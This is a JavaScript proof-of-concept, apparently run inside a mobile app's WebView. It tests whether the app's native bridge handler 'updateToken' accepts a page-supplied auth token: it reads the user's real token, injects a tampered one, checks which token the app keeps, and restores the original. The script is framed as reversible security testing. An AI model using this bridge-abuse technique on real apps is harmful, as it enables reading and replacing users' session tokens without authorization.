// Does UserProfile.updateToken validate what the page hands it?
// Fully reversible: the real token is captured at runtime (never shipped in this file) and
// put back at the end. A tampered-signature token is used as the probe, so even if the app
// adopts it, nothing authenticates and the original is restored seconds later.
(function () {
  var L = [], real = null, phase = 0;
  var pre = document.createElement("pre");
  pre.style = "font:11px monospace;white-space:pre-wrap;word-break:break-all;background:#fff;color:#000;padding:6px";
  document.body.innerHTML = ""; document.body.appendChild(pre);
  function w(s){ L.push(s); pre.textContent = "=== updateToken VALIDATION TEST ===\n" + L.join("\n"); }
  function call(m,f,p){ return window.flutter_inappwebview.callHandler("_b_bridge_"+m+"_",
    JSON.stringify({moduleName:m, methodName:f, uniqueId:"ut"+(++phase), params:p||{}})); }
  window._b_bridge_callback_ = function (o) {
    try { var d = (typeof o === "string") ? JSON.parse(o) : o;
      if (d.methodName === "getUserProfile") {
        var t = d.params && d.params.userToken;
        var verdict = "";
        if (real) verdict = (t === real) ? "  == REAL (app rejected the tampered token)"
                          : (t === tamper(real) ? "  == TAMPERED (app ACCEPTED page-supplied token)" : "  == SOMETHING ELSE");
        w("  getUserProfile -> uid=" + (d.params && d.params.uid) +
          " tail=" + (t ? t.slice(-12) : "(none)") + " len=" + (t ? t.length : 0) + verdict);
        if (!real && t) real = t;
      } else { w("  cb " + d.moduleName + "." + d.methodName + " code=" + d.code); }
    } catch (e) { w("cb err " + e); }
  };
  window.invokeCallback = window._b_bridge_callback_;

  // Unmistakable tamper: rewrite the LAST 8 chars of the signature so the tail differs.
  function tamper(t){ var p = t.split("."); p[2] = p[2].slice(0,-8) + "ZZZZZZZZ"; return p.join("."); }

  w("step1: read the real token");
  call("UserProfile","getUserProfile",{});
  setTimeout(function(){
    if (!real) { w("!! no token captured, aborting"); return; }
    var bad = tamper(real);
    w("\nstep2: updateToken with a TAMPERED-SIGNATURE token\n  tail " + bad.slice(-14) + " (real tail " + real.slice(-14) + ")");
    call("UserProfile","updateToken",{token: bad});
  }, 4000);
  setTimeout(function(){ w("\nstep3: read back, which token is the app holding?"); call("UserProfile","getUserProfile",{}); }, 8000);
  setTimeout(function(){ if (real) { w("\nstep4: restoring the real token"); call("UserProfile","updateToken",{token: real}); } }, 12000);
  setTimeout(function(){ w("\nstep5: final read"); call("UserProfile","getUserProfile",{}); }, 16000);
})();
